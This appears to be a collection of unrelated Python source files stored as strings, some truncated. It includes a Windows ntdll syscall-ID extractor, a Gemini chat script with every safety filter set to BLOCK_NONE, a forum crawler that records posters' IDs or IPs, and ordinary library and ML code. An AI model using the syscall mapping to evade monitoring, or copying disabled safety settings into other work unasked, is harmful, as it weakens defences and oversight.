    "'''\n    Author: G. Narasimha Reddy\n'''\n\nimport pefile\nimport struct\nimport platform\n\n'''\n// syscall stub in x64 Windows OS:\n\n  4C 8B D1                | mov r10, rcx\n  B8 -- -- -- --          | mov eax, <syscall id>\n  F6 04 25 -- -- -- -- -- | test byte ptr ds:[-- -- -- --], --\n  75 03                   | jne ntdll.xxxxxxxx                      // jump 3 bytes from the end of this instruction.\n  0F 05                   | syscall\n  C3                      | ret\n  CD 2E                   | int 2E                                 // jump here if not equal.\n  C3                      | ret\n  \n'''\n\ndef is_syscall_stub(code):\n    # Check if the code matches the syscall stub pattern\n    return (\n        len(code) >= 24 and\n        code[0:4] == b'\\x4C\\x8B\\xD1\\xB8' and\n        code[8:11] == b'\\xF6\\x04\\x25' and\n        code[16:24] == b'\\x75\\x03\\x0F\\x05\\xC3\\xCD\\x2E\\xC3'\n    )\n\ndef extract_syscall_id(code):\n    # Extract syscall ID from the code\n    syscall_id = struct.unpack('I', code[4:8])[0]  # Assuming syscall id is a 4-byte little-endian integer\n    return syscall_id\n\ndef parse_exports(dll_paths):\n    syscall_name_to_id = {}  # Dictionary to store syscall names and IDs\n    syscall_id_to_name = {}  # Dictionary to store syscall IDs and names\n    \n    for dll_path in dll_paths:\n        try:\n            pe = pefile.PE(dll_path)\n            if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):\n                export_table = pe.DIRECTORY_ENTRY_EXPORT.symbols\n\n                for exp in export_table:\n                    if exp.address:\n                        export_offset = pe.get_offset_from_rva(exp.address)\n                        code = pe.get_data(exp.address, 24)\n                        if is_syscall_stub(code):\n                            syscall_id = extract_syscall_id(code)\n                            syscall_name = exp.name.decode() if exp.name else 'No Name'\n                            syscall_name_to_id[syscall_name] = syscall_id\n                            syscall_id_to_name[syscall_id] = syscall_name\n\n        except Exception as e:\n            print(f\"Error: {e}\")\n    \n    return syscall_name_to_id, syscall_id_to_name\n\ndef print_syscall_id(syscall_dict, syscall_name):\n    if syscall_name in syscall_dict:\n        print(f\"Syscall Name: {syscall_name}, Syscall ID (hex): {hex(syscall_dict[syscall_name])}\")\n    else:\n        print(\"Syscall Name not found in the dictionary.\")\n\ndef print_syscall_name(syscall_dict, syscall_id):\n    if syscall_id in syscall_dict:\n        print(f\"Syscall ID (hex) : {hex(syscall_id)}, Syscall Name: {syscall_dict[syscall_id]}\")\n    else:\n        print(\"Syscall ID not found in the dictionary.\")\n\n\nif __name__ == \"__main__\":\n    dll_paths = [\"C:\\\\Windows\\\\System32\\\\ntdll.dll\", \"C:\\\\Windows\\\\System32\\\\win32u.dll\"]  # Change this path accordingly\n    syscall_name_to_id, syscall_id_to_name = parse_exports(dll_paths)\n    \n    # Print OS info.\n    print(\"OS Info:\")\n    print(f\"[{platform.system()} {platform.release()}] ver. {platform.version()}\\n\")\n    \n    # Example usage for syscall name to ID\n    syscall_names = [\"NtClose\", \"NtOpenProcess\", \"NtReadFile\", \"NtUserGetOemBitmapSize\"]  # Example values, change this accordingly\n    for syscall_name in syscall_names:\n        print_syscall_id(syscall_name_to_id, syscall_name)\n    \n    \n    # Example usage for syscall ID to name\n    syscall_ids = [0x32, 0x3A, 0x42]  # Example values, change this accordingly\n    for syscall_id in syscall_ids:\n        print_syscall_name(syscall_id_to_name, syscall_id)\n",
    "import sys\nfrom itertools import chain\nfrom typing import TYPE_CHECKING, Iterable, Optional\n\nif sys.version_info >= (3, 8):\n    from typing import Literal\nelse:\n    from pip._vendor.typing_extensions import Literal  # pragma: no cover\n\nfrom .constrain import Constrain\nfrom .jupyter import JupyterMixin\nfrom .measure import Measurement\nfrom .segment import Segment\nfrom .style import StyleType\n\nif TYPE_CHECKING:\n    from .console import Console, ConsoleOptions, RenderableType, RenderResult\n\nAlignMethod = Literal[\"left\", \"center\", \"right\"]\nVerticalAlignMethod = Literal[\"top\", \"middle\", \"bottom\"]\n\n\nclass Align(JupyterMixin):\n    \"\"\"Align a renderable by adding spaces if necessary.\n\n    Args:\n        renderable (RenderableType): A console renderable.\n        align (AlignMethod): One of \"left\", \"center\", or \"right\"\"\n        style (StyleType, optional): An optional style to apply to the background.\n        vertical (Optional[VerticalAlginMethod], optional): Optional vertical align, one of \"top\", \"middle\", or \"bottom\". Defaults to None.\n        pad (bool, optional): Pad the right with spaces. Defaults to True.\n        width (int, optional): Restrict contents to given width, or None to use default width. Defaults to None.\n        height (int, optional): Set height of align renderable, or None to fit to contents. Defaults to None.\n\n    Raises:\n        ValueError: if ``align`` is not one of the expected values.\n    \"\"\"\n\n    def __init__(\n        self,\n        renderable: \"RenderableType\",\n        align: AlignMethod = \"left\",\n        style: Optional[StyleType] = None,\n        *,\n        vertical: Optional[VerticalAlignMethod] = None,\n        pad: bool = True,\n        width: Optional[int] = None,\n        height: Optional[int] = None,\n    ) -> None:\n        if align not in (\"left\", \"center\", \"right\"):\n            raise ValueError(\n                f'invalid value for align, expected \"left\", \"center\", or \"right\" (not {align!r})'\n            )\n        if vertical is not None and vertical not in (\"top\", \"middle\", \"bottom\"):\n            raise ValueError(\n                f'invalid value for vertical, expected \"top\", \"middle\", or \"bottom\" (not {vertical!r})'\n            )\n        self.renderable = renderable\n        self.align = align\n        self.style = style\n        self.vertical = vertical\n        self.pad = pad\n        self.width = width\n        self.height = height\n\n    def __repr__(self) -> str:\n        return f\"Align({self.renderable!r}, {self.align!r})\"\n\n    @classmethod\n    def left(\n        cls,\n        renderable: \"RenderableType\",\n        style: Optional[StyleType] = None,\n        *,\n        vertical: Optional[VerticalAlignMethod] = None,\n        pad: bool = True,\n        width: Optional[int] = None,\n        height: Optional[int] = None,\n    ) -> \"Align\":\n        \"\"\"Align a renderable to the left.\"\"\"\n        return cls(\n            renderable,\n            \"left\",\n            style=style,\n            vertical=vertical,\n            pad=pad,\n            width=width,\n            height=height,\n        )\n\n    @classmethod\n    def center(\n        cls,\n        renderable: \"RenderableType\",\n        style: Optional[StyleType] = None,\n        *,\n        vertical: Optional[VerticalAlignMethod] = None,\n        pad: bool = True,\n        width: Optional[int] = None,\n        height: Optional[int] = None,\n    ) -> \"Align\":\n        \"\"\"Align a renderable to the center.\"\"\"\n        return cls(\n            renderable,\n            \"center\",\n            style=style,\n            vertical=vertical,\n            pad=pad,\n            width=width,\n            height=height,\n        )\n\n    @classmethod\n    def right(\n        cls,\n        renderable: \"RenderableType\",\n        style: Optional[StyleType] = None,\n        *,\n        vertical: Optional[VerticalAlignMethod] = None,\n        pad: bool = True,\n        width: Optional[int] = None,\n        height: Optional[int] = None,\n    ) -> \"Align\":\n        \"\"\"Align a renderable to the right.\"\"\"\n        return cls(\n            renderable,\n            \"right\",\n            style=style,\n            vertical=vertical,\n            pad=pad,\n            width=width,\n            height=height,\n        )\n\n    def __rich_console__(\n        self, console: \"Console\", options: \"ConsoleOptions\"\n    ) -> \"RenderResult\":\n        align = self.align\n        width = console.measure(self.renderable, options=options).maximum\n        rendered = console.render(\n            Constrain(\n                self.renderable, width if self.width is None else min(width, self.width)\n            ),\n            options.update(height=None),\n        )\n        lines = list(Segment.split_lines(rendered))\n        width, height = Segment.get_shape(lines)\n        lines = Segment.set_shape(lines, width, height)\n        new_line = Segment.line()\n        excess_space = options.max_width - width\n        style = console.get_style(self.style) if self.style is not None else None\n\n        def generate_segments() -> Iterable[Segment]:\n            if exces",
    "import google.generativeai as genai\nfrom dotenv import load_dotenv\nimport os\n\nload_dotenv()\nGEMINI_API_KEY = os.getenv('GEMINI_API_KEY')\n\ngenai.configure(api_key=GEMINI_API_KEY)\n\n# Set up the model\ngeneration_config = {\n  \"temperature\": 0.9,\n  \"top_p\": 1,\n  \"top_k\": 1,\n  \"max_output_tokens\": 2048,\n}\n\n# gemini safety config\nsafety_settings = [\n  {\n    \"category\": \"HARM_CATEGORY_HARASSMENT\",\n    \"threshold\": \"BLOCK_NONE\"\n  },\n  {\n    \"category\": \"HARM_CATEGORY_HATE_SPEECH\",\n    \"threshold\": \"BLOCK_NONE\"\n  },\n  {\n    \"category\": \"HARM_CATEGORY_SEXUALLY_EXPLICIT\",\n    \"threshold\": \"BLOCK_NONE\"\n  },\n  {\n    \"category\": \"HARM_CATEGORY_DANGEROUS_CONTENT\",\n    \"threshold\": \"BLOCK_NONE\"\n  },\n]\n\nmodel = genai.GenerativeModel(model_name=\"gemini-1.0-pro\",\n                              generation_config=generation_config,\n                              safety_settings=safety_settings)\n\nconvo = model.start_chat(history=[\n])\n\nconvo.send_message(\"dime una historia peque\u00f1a de un p\u00e1rrafo que incluya la palabra pi\u00f1a\")\nprint(convo.last.text)",
    "import asyncio\r\nfrom datetime import datetime\r\nimport json\r\nimport os\r\nimport shutil\r\nimport subprocess\r\nimport time\r\n\r\n# Import pip modules\r\nimport importlib.util\r\n\r\nif importlib.util.find_spec('aiohttp') is None or \\\r\n   importlib.util.find_spec('aiofiles') is None or \\\r\n   importlib.util.find_spec('bs4') is None:\r\n    print('======================================================================')\r\n    print('Module import error raised, installing required modules.')\r\n    print('======================================================================')\r\n    subprocess.run(['pip', 'install', '-r', './requirements.txt'])\r\n    print('======================================================================')\r\n\r\nimport aiohttp\r\nimport aiofiles\r\nfrom bs4 import BeautifulSoup\r\n\r\n# Set core variables with config values\r\nwith open('./config.json', 'r') as f:\r\n    config = json.load(f)\r\n\r\nGALLERY_ID: str = config['gallery_id']\r\nGALLERY_URL: str = 'https://gall.dcinside.com/m/' + GALLERY_ID\r\nstart_from: int = config['start_from']\r\n\r\nSAVE_DIR: str = config['save_dir'].rstrip('/')\r\n\r\nUPDATE_INTERVAL: int = config['update_interval_second']\r\nRETRY_INTERVAL: int = config['retry_interval_second']\r\n\r\nESSENTIAL_HEADERS: dict[str, str] = config['essential_header']\r\nVIDEO_IFRAME_HEADERS: dict[str, str] = ESSENTIAL_HEADERS | config['additional_video_iframe_header']\r\nVIDEO_HEADERS: dict[str, str] = ESSENTIAL_HEADERS | config['additional_video_header']\r\n\r\ndef log_print(log_type: str, message: str):\r\n    print(f'{log_type:<8} | {datetime.now():%Y-%m-%d %X}: {message}')\r\n\r\nasync def http_get(url: str, headers: dict[str, str], *, until_ok=True) -> bytes:\r\n    async with aiohttp.ClientSession() as session:\r\n        while True:\r\n            try:\r\n                async with session.get(url, headers=headers) as response:\r\n                    if response.ok:\r\n                        return await response.read()\r\n                    elif response.status < 500:\r\n                        response.raise_for_status()\r\n            except aiohttp.ClientConnectionError:\r\n                if not until_ok:\r\n                    raise\r\n\r\n            time.sleep(RETRY_INTERVAL)\r\n\r\nasync def get_latest_article_number() -> int:\r\n    while True:\r\n        response = await http_get(GALLERY_URL, headers=ESSENTIAL_HEADERS)\r\n        soup = BeautifulSoup(response.decode(), 'html.parser')\r\n\r\n        latest_article = soup.select_one('tr:not([data-type=\"icon_notice\"]).us-post')\r\n\r\n        if latest_article is not None:\r\n            latest_article_number = latest_article.select_one('td.gall_num')\r\n\r\n            if latest_article_number is not None:\r\n                return int(latest_article_number.text)\r\n\r\n        time.sleep(RETRY_INTERVAL)\r\n\r\nasync def save_binary(data: bytes, path: str):\r\n    async with aiofiles.open(path, 'wb') as f:\r\n        await f.write(data)\r\n\r\nasync def crawl_article(article_number: int):\r\n    try:\r\n        response = await http_get(f'{GALLERY_URL}/{article_number}', ESSENTIAL_HEADERS)\r\n        article = BeautifulSoup(response.decode(), 'html.parser')\r\n    except aiohttp.ClientResponseError:\r\n        log_print('FAIL', f'Failed to get article {article_number}')\r\n        return\r\n\r\n    # Step 1. Query select core elements\r\n    title_element = article.select_one('span.title_subject')\r\n    writer_element = article.select_one('div.gall_writer.ub-writer')\r\n    date_element = article.select_one('span.gall_date')\r\n    text_element = article.select_one('div.write_div')\r\n    image_elements = article.select('ul.appending_file > li > a')\r\n    video_iframe_elements = article.select('iframe[id^=\"movie\"]')\r\n\r\n    # Step 2. Check if any core elements are not exist\r\n    #         We don't need to check image and video elements(It can be not exist)\r\n    try:\r\n        assert title_element is not None\r\n        assert writer_element is not None\r\n        assert date_element is not None\r\n        assert text_element is not None\r\n    except AssertionError:\r\n        log_print('FAIL', f'Some of core elements are not found\\n\\tAt article {article_number}')\r\n        return\r\n\r\n    # Step 3. Get string data including title, nickname, id, date and text of article\r\n    title = title_element.text\r\n    nickname = writer_element.attrs.get('data-nick')\r\n    id = writer_element.attrs.get('data-uid') or\\\r\n         writer_element.attrs.get('data-ip')\r\n    date = date_element.attrs.get('title')\r\n    text = text_element.get_text()\r\n\r\n    # Step 4. Check if any writer/date elements are not exist\r\n    try:\r\n        assert nickname is not None\r\n        assert id is not None\r\n        assert date is not None\r\n    except AssertionError:\r\n        log_print('FAIL', f'Some of elements(writer, date) are not found\\n\\tAt article {article_number}')\r\n        return\r\n\r\n    # Step 5-1. Create folder that we need to save in\r\n    folder_path = f'{SAVE_DIR}/{article_number}'\r\n    os.makedirs(folder_path, exist_ok=True)\r\n\r\n    # Step 5-2. Get media data including images and videos\r\n    #           We can pr",
    "import torch\r\nfrom transformers import AutoTokenizer, AutoModel, pipeline\r\nimport re\r\nimport numpy as np\r\nimport pandas as pd\r\nimport os\r\nimport requests\r\nfrom tqdm.auto import tqdm\r\nfrom torch.utils.data import Dataset, DataLoader\r\n\r\nproteinmaxlens = 1024\r\n\r\nstep = proteinmaxlens//2\r\n\r\n\r\ndef sequencechange(sequence):\r\n    '''\r\n    input a protien sequence and return a sequence with blank intervals\r\n    :param sequence:eg: \"MSPLNQ\"\r\n    :return: eg: \"M S P L N Q\"\r\n    '''\r\n    new_seq = \"\"\r\n    count = 0\r\n    for i in sequence:\r\n        if i == ' ':\r\n            continue\r\n        new_seq += i\r\n        count += 1\r\n        if count == len(sequence):\r\n            continue\r\n        new_seq += ' '\r\n    return new_seq\r\nclass mydata(Dataset):\r\n    def __init__(self,protdata):\r\n        self.protiens=protdata\r\n        self.len=len(protdata)\r\n    def __getitem__(self, idx):\r\n        return self.protiens[idx]\r\n    def __len__(self):\r\n        return self.len\r\ndef preparedata(data_path):\r\n    f=pd.read_csv(data_path+\"/protein.csv\")\r\n    N = f.protein.values.shape[0]\r\n    proteins= []\r\n    for i in range(N):\r\n        print('/'.join(map(str, [i + 1, N])))\r\n        proteins.append(f.protein.values[i])\r\n    print(str(len(proteins[0]))+' unique protein sequences in total!')\r\n    proteins = [re.sub(r\"[UZOB]\", \"X\", sequence) for sequence in proteins]\r\n    return proteins,N\r\ndef preparedataset(DATASET):\r\n    proteins,N=preparedata(DATASET)\r\n    proteinloader=DataLoader(mydata(proteins),shuffle=False,batch_size=1,drop_last=False)\r\n    return proteinloader,N\r\ndef process(prt):\r\n    #protein maxlength=1024\r\n    prt=prt[0]\r\n    list=[]\r\n    N=len(prt)\r\n    if N>proteinmaxlens:\r\n        i=0\r\n        while (i+1)*step<N:\r\n            slice = prt[i*step:min(i*step+proteinmaxlens,N)]\r\n            slice = sequencechange(slice)\r\n            list.append(slice)\r\n            i+=1\r\n    else:\r\n        prt = sequencechange(prt)\r\n        list.append(prt)\r\n    return list\r\n\r\ndef get_protein_embeddings(dir_path,device):\r\n    tokenizer = AutoTokenizer.from_pretrained(\"Rostlab/prot_bert\", do_lower_case=False)\r\n    model = AutoModel.from_pretrained(\"Rostlab/prot_bert\")\r\n    # device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\r\n    fe = pipeline('feature-extraction', model=model, tokenizer=tokenizer, device=device)\r\n    proteinloader, N = preparedataset(dir_path)\r\n    features = []\r\n    i = 0\r\n    for prt in tqdm(proteinloader):\r\n\r\n        print('/'.join(map(str, [i + 1, N])))\r\n        getprt = process(prt)\r\n        if len(getprt)>1:\r\n            j = 1\r\n            for protein in getprt:\r\n                embedding = fe([protein])\r\n                embedding = np.array(embedding)\r\n                embedding = embedding.reshape(-1, 1024)\r\n                embed = embedding[1:embedding.shape[0] - 1]\r\n                if j==1:\r\n                    fullembed = embed\r\n                else:\r\n                    fullembed[-step:]=(embed[0:step]+fullembed[-step:])/2\r\n                    fullembed = np.append(fullembed,embed[step:],axis=0)\r\n                if j==len(getprt):\r\n                    features.append(fullembed)\r\n                j += 1\r\n            i += 1\r\n        else:\r\n            embedding = fe(getprt)\r\n            embedding = np.array(embedding)\r\n            embedding = embedding.reshape(-1, 1024)\r\n            embed = embedding[1:embedding.shape[0] - 1]\r\n            features.append(embed)\r\n            i += 1\r\n    features =np.array(features,dtype=object)\r\n    np.save(dir_path + '/proteinsembeddings', features,allow_pickle=True)\r\n    print('The preprocess of dataset has finished!')\r\nif __name__ == \"__main__\":\r\n    DATASET = \"human\"\r\n    tokenizer = AutoTokenizer.from_pretrained(\"Rostlab/prot_bert\", do_lower_case=False)\r\n    model = AutoModel.from_pretrained(\"Rostlab/prot_bert\")\r\n    device = torch.device('cuda:0' if torch.cuda.is_available() else 'cpu')\r\n    fe = pipeline('feature-extraction', model=model, tokenizer=tokenizer, device=device)\r\n    proteinloader, N = preparedataset(DATASET)\r\n    features = []\r\n    i = 0\r\n    for prt in tqdm(proteinloader):\r\n        print(type(prt),len(prt))\r\n        print('/'.join(map(str, [i + 1, N])))\r\n        getprt = process(prt)\r\n        if len(getprt)>1:\r\n            j = 1\r\n            for protein in getprt:\r\n                embedding = fe([protein])\r\n                embedding = np.array(embedding)\r\n                embedding = embedding.reshape(-1, 1024)\r\n                embed = embedding[1:embedding.shape[0] - 1]\r\n                if j==1:\r\n                    fullembed = embed\r\n                else:\r\n                    fullembed[-step:]=(embed[0:step]+fullembed[-step:])/2\r\n                    fullembed = np.append(fullembed,embed[step:],axis=0)\r\n                if j==len(getprt):\r\n                    features.append(fullembed)\r\n                j += 1\r\n            i += 1\r\n        else:\r\n            embedding = fe(getprt)\r\n            embedding = np.array(embedding)\r\n            embedding = embed",
    "\n# Handle imports\nimport espnow\nimport network\nimport time\n\nfrom glib import pickle\nfrom glib.glog import Logger\n\n\"\"\"\nLog levels:\n    1 = Errors only\n    2 = Information and errors\n    3 = Debug, info, and errors\n\"\"\"\nlogger = Logger(2)\n\nclass Peer:\n    \"\"\" Represents a Peer communicating via ESPNOW \"\"\"\n\n    def __init__(self, mac_address, name=\"\", connection=None):\n\n        self._name = name.upper()\n        self._mac_string = mac_address.upper()\n        self._mac_btyearray = self._encode()\n        self._connection = connection\n    \n    def _encode(self):\n\n        return bytearray(int(part, 16) for part in self._mac_string.split(\":\"))\n\n    def _decode(self):\n\n        return ':'.join('{:02x}'.format(b) for b in self._mac_btyearray).upper()\n\n    def setName(self, name):\n\n        self._name = name.upper()\n    \n    def getName(self):\n\n        return self._name\n\n    def getMAC(self):\n\n        return self._mac_string\n    \n    def getMACEncoded(self):\n        \n        return self._mac_btyearray\n    \n    def send(self, data):\n\n        serialized_data = pickle.dumps(data)\n        logger.info(\"  Sending to: \" + str(self))\n        logger.info(\"   \" + str(data))\n        self._connection.send(self._mac_btyearray, serialized_data)\n    \n    def __repr__(self):\n        return_string = \"Peer (\" + self.getMAC()\n        if (len(self.getName()) > 0):\n            return_string = return_string + \" - \" + self.getName()\n        return_string = return_string + \")\"\n        return return_string\n\n\nclass PeerGroup:\n    \"\"\" Represents a group of Peers communicating via ESPNOW \"\"\"\n\n    def __init__(self, parent, name):\n\n        # Set the PeerGroup's attributes\n        self.name = name.upper()\n        self.parent = parent\n\n        # Set up the peer list\n        self.peers = {}\n\n    def peerAdd(self, mac_address, name=\"\"):\n        \n        logger.info(\" Adding peer: \" + mac_address)\n\n        peer = Peer(mac_address, name, connection=self.parent._connection)\n        try:\n            peer = Peer(mac_address, name, connection=self.parent._connection)\n        except:\n            logger.info(\"  ERROR: Could not add peer\")\n        else:\n            self.parent._connection.add_peer(peer._mac_btyearray)\n            self.peers[peer.getMAC()] = peer\n            self.parent.peers[peer.getMAC()] = peer\n            return peer\n    \n    def peerRemove(self, mac_address):\n\n        logger.info(\" Removing Peer: \" + mac_address)\n        \n        try:\n            peer = self.peers[mac_address]\n        except KeyError:\n            logger.info(\"  Could not find referenced Peer.\")\n        else:\n            self.parent._connection.del_peer(peer.getMACEncoded())\n            del self.peers[mac_address]\n            del self.parent.peers[mac_address]\n    \n    def peerFindByName(self, name):\n\n        name = name.upper()\n\n        logger.info(\" Searching for Peer by name: \" + name)\n        for peer_mac in self.peers.keys():\n            peer = self.peers[peer_mac]\n            if (peer.getName() == name):\n                logger.info(\" Success.\")\n                return peer\n        logger.info(\"  No match could be located.\")\n        return None\n    \n    def peerFindByMAC(self, mac_address):\n\n        mac_address = mac_address.upper()\n        \n        logger.info(\" Searching for Peer by MAC: \" + mac_address)\n\n        try:\n            peer = self.peers[mac_address]\n        except KeyError:\n            logger.info(\"  Could not find referenced Peer.\")\n        else:\n            logger.info(\"   Success.\")\n            return peer\n    \n    def send(self, data):\n\n        if (len(self.peers) > 0):\n\n            logger.info(\" Sending to: \" + str(self))\n            \n            for peer_mac in self.peers.keys():\n                self.peers[peer_mac].send(data)\n        else:\n\n            logger.info(\" ERROR: No peers in group.\")\n    \n    def __repr__(self):\n        return \"PeerGroup (\" + self.name + \")\"\n\n\nclass Connection(Peer):\n\n    \"\"\" Represents both a Peer and an ESPNOW connection \"\"\"\n\n    def __init__(self):\n\n        # Set up self-referenced Peer information\n        self._name = \"SELF\"\n\n        # Activate WLAN interface\n        self._wlan = network.WLAN(network.STA_IF)\n        self._wlan.active(True)\n\n        # Set up ESPNOW connection\n        self._connection = espnow.ESPNow()\n        self._connection.active(True)\n    \n        # Set up additional self-derived Peer information\n        self._mac_btyearray = self._wlan.config('mac')\n        self._mac_string = self._decode()\n\n        # Initialize the list of Peers and PeerGroups\n        self.peers = {}\n        self.peer_groups = {}\n\n        # Set up the broadcast PeerGroup\n        peer_group_broadcast = self.peerGroupAdd(\"BROADCAST\")\n        peer_broadcast = peer_group_broadcast.peerAdd(\"FF:FF:FF:FF:FF:FF\", \"BROADCAST\")\n        del self.peers[peer_broadcast.getMAC()]        \n\n        # Set up the default callback handler\n        self._connection.irq(self._callbackOnReceive)\n\n        logger.info(\"Configured connection for: \" + self.getMA",
    "#!/usr/bin/python3\n\nimport random\nimport os\nimport threading\nimport socketserver\nimport time\nimport sys\n\ntotalRuns = random.randint(50, 70)\n\nmorse_code = {\"A\": \".-\", \"B\": \"-...\", \"C\": \"-.-.\", \"D\": \"-..\", \"E\": \".\", \"F\": \"..-.\", \"G\": \"--.\", \"H\": \"....\", \"I\": \"..\", \"J\": \".---\", \"K\": \"-.-\", \"L\": \".-..\", \"M\": \"--\", \"N\": \"-.\", \"O\": \"---\", \"P\": \".--.\", \"Q\": \"--.-\", \"R\": \".-.\", \"S\": \"...\", \"T\": \"-\", \"U\": \"..-\", \"V\": \"...-\", \"W\": \".--\", \"X\": \"-..-\", \"Y\": \"-.--\", \"Z\": \"--..\", \"1\": \".----\", \"2\": \"..---\", \"3\": \"...--\", \"4\": \"....-\", \"5\": \".....\", \"6\": \"-....\", \"7\": \"--...\", \"8\": \"---..\", \"9\": \"----.\", \"10\": \"-----\"}\n\nphrases = [\n    \"Late nights in library\",\n    \"Coffee fuels study sessions\",\n    \"Exams looming stress rising\",\n    \"Friends bond over textbooks\",\n    \"Pizza for dinner again\",\n    \"Lecture hall crowded always\",\n    \"Parties after final exams\",\n    \"Dorm life noisy neighbors\",\n    \"Professors office hours invaluable\",\n    \"Group projects endless coordination\",\n    \"Campus squirrels steal attention\",\n    \"Weekend trips for relaxation\",\n    \"Graduation day dreams realized\",\n    \"Scholarship applications endless essays\",\n    \"Student discounts budget friendly\",\n    \"Research papers sleepless nights\",\n    \"Summer internships career building\",\n    \"Joining clubs finding community\",\n    \"Studying abroad global adventures\",\n    \"Thesis defense nerves high\",\n    \"Tutoring sessions extra help\",\n    \"Campus traditions cherished memories\",\n    \"Student protests making change\",\n    \"Library quiet zones sanctuary\",\n    \"Student loans looming burden\",\n    \"Campus tour first impressions\",\n    \"Final project presentations nerves wrecked\",\n    \"Homecoming game school spirit\",\n    \"All nighters before midterms\",\n    \"Peer mentoring guiding newcomers\",\n    \"Lab experiments hypotheses tested\",\n    \"Sweatshirts branded with university\",\n    \"Networking events career connections\",\n    \"Dorm room decorations personal touches\",\n    \"Coffee shop study sessions\",\n    \"Graduation cap and gown\",\n    \"Textbook buyback minimal returns\",\n    \"Syllabus week easing in\",\n    \"Student government elections campaigning\",\n    \"Online courses flexible schedules\",\n    \"Campus map navigation aid\",\n    \"Athletic events cheering wildly\",\n    \"Cramming for finals last minute panic\",\n    \"Frat parties music blasting\",\n    \"Picking classes scheduling puzzle\",\n    \"Midterm grades anxiety spikes\",\n    \"Hitting snooze button repeatedly\",\n    \"Academic advisor meetings course planning\",\n    \"Job fairs career opportunities\",\n    \"Campus cafeteria culinary adventures\",\n    \"GPA goals striving for excellence\",\n    \"Student discounts saving money\",\n    \"Group study sessions collaborative learning\",\n    \"Student lounge hangout spot\",\n    \"Sweatpants as daily attire\",\n    \"Campus art installations creative inspiration\",\n    \"Thesis research scholarly pursuit\",\n    \"Dormitory curfews rules enforced\",\n    \"Class discussions diverse perspectives\",\n    \"Online lectures asynchronous learning\",\n    \"Campus security ensuring safety\",\n    \"Study breaks Netflix binge watching\",\n    \"Freshman orientation making friends\",\n    \"Student newspaper campus news\",\n    \"Textbook rentals cost effective option\",\n    \"Graduation cap decoration personal flair\",\n    \"Campus bookstore expensive textbooks\",\n    \"Dorm room essentials checklist\",\n    \"Internship interviews professional attire\",\n    \"Student ID card access pass\",\n    \"Graduation ceremony rehearsal practice run\",\n    \"Campus traditions passed down\",\n    \"Student loans financial aid\",\n    \"Toga party college classic\",\n    \"Club meetings shared interests\",\n    \"Midnight pizza delivery study fuel\",\n    \"College radio station indie tunes\",\n    \"Extracurricular activities well rounded resume\",\n    \"Roommate conflicts communication essential\",\n    \"Laptop as constant companion\",\n    \"Graduation countdown bittersweet anticipation\",\n    \"Study abroad application adventure awaits\",\n    \"Campus bookstore merchandise galore\",\n    \"Dorm room move in day\",\n    \"Commencement speech words inspire\",\n    \"Campus security escort late night walks\",\n    \"Class registration race against time\",\n    \"Library fines forgetful moments\",\n    \"Sorority rush sisterhood bonds\",\n    \"Dormitory fire drill inconvenience endured\",\n    \"Coffee shop barista knows order\",\n    \"Campus gym fitness goals\",\n    \"Mandatory orientation sessions information overload\",\n    \"Group project dynamics teamwork challenges\",\n    \"Finals week survival guide\",\n    \"Fall semester fresh start\",\n    \"Graduation cap toss symbolic gesture\",\n    \"Campus shuttle convenient transport\",\n    \"Student activism voicing concerns\",\n    \"Winter break travels homecoming joy\",\n    \"Dormitory roommate assignments luck of draw\",\n    \"Campus events calendar always full\",\n    \"College town adventures local charm\",\n    \"Graduation photoshoot memories captured\",\n    \"Campus mailroom package pickup\",\n    \"Study abroad blog documenting experiences\",\n    \"Orientation leader guiding newcomers\",\n    \"St",
    "import sys\r\nfrom src.News_Reporter import NewsAnalysisEngine\r\nfrom src.Blog_Generator import BlogPostGenerator\r\nfrom datetime import datetime\r\n\r\ndef generate_news_and_blog(topic):\r\n    \"\"\"\r\n    Generates news analysis and blog post for the given topic.\r\n\r\n    Args:\r\n        topic (str): The topic for which the news analysis and blog post should be generated.\r\n\r\n    Returns:\r\n        str: The news analysis result.\r\n        str: The generated blog post.\r\n    \"\"\"\r\n    engine = NewsAnalysisEngine()\r\n    blog_post_generator = BlogPostGenerator()\r\n    d = datetime.now().strftime(\"%Y-%m-%d\")\r\n    result = engine.analyze_news(f\"{topic} today's Date is :-{d}\")\r\n    blog_post = blog_post_generator.generate_blog_post(result)\r\n    return result, blog_post\r\n\r\nif __name__ == \"__main__\":\r\n    if len(sys.argv) < 2:\r\n        print(\"Please provide a topic as a command-line argument.\")\r\n        sys.exit(1)\r\n    topic = \" \".join(sys.argv[1:])\r\n    news_analysis, blog_post = generate_news_and_blog(topic)\r\n    print(\"================================News Analysis+++++++++++++++++++++++++\")\r\n    print(news_analysis)\r\n    print(\"================================This is The Actual Blog post +++++++++++++++++++++++++\")\r\n    print(blog_post)",
    "\"\"\"This module contains the health router for the application.\"\"\"\n\nimport importlib.metadata\nimport time\nfrom datetime import datetime, timezone\nfrom typing import Annotated\n\nfrom fastapi import APIRouter, Depends, Response, status\nfrom sophrosyne.api.dependencies import get_db_session, get_settings, is_authenticated\nfrom sophrosyne.core.config import Settings\nfrom sophrosyne.healthcheck.models import Check, HealthCheck, Status, SubComponent\nfrom sqlmodel import text\nfrom sqlmodel.ext.asyncio.session import AsyncSession\n\nrouter = APIRouter()\n\n\n@router.get(\"\", response_model=HealthCheck)\nasync def get_health(\n    response: Response,\n    settings: Annotated[Settings, Depends(get_settings)],\n    db_session: Annotated[AsyncSession, Depends(get_db_session)],\n    is_authenticated: Annotated[bool, Depends(is_authenticated)],\n) -> HealthCheck:\n    \"\"\"Get the health of the application.\n\n    Args:\n        response (Response): The response object.\n        settings (Settings): The application settings.\n        db_session (AsyncSession): The database session.\n        is_authenticated (bool): Flag indicating if the user is authenticated.\n\n    Returns:\n        HealthCheck: The health of the application.\n    \"\"\"\n    response.headers[\"Cache-Control\"] = \"no-cache\"\n    hc: HealthCheck\n    if is_authenticated:\n        hc = await do_authenticated_healthcheck(db_session=db_session)\n    else:\n        hc = await do_healthcheck(db_session=db_session)\n\n    if hc.status == Status.PASS:\n        response.status_code = status.HTTP_200_OK\n    else:\n        response.status_code = status.HTTP_503_SERVICE_UNAVAILABLE\n    return hc\n\n\n@router.get(\"/ping\", response_model=str)\nasync def ping() -> str:\n    \"\"\"Ping endpoint to check if the server is running.\"\"\"\n    return \"pong\"\n\n\nasync def do_authenticated_healthcheck(db_session: AsyncSession) -> HealthCheck:\n    \"\"\"Perform an authenticated health check.\n\n    Args:\n        db_session (AsyncSession): The database session.\n\n    Returns:\n        HealthCheck: The health check result.\n    \"\"\"\n    status: Status\n    output: str | None = None\n    end: int\n    begin 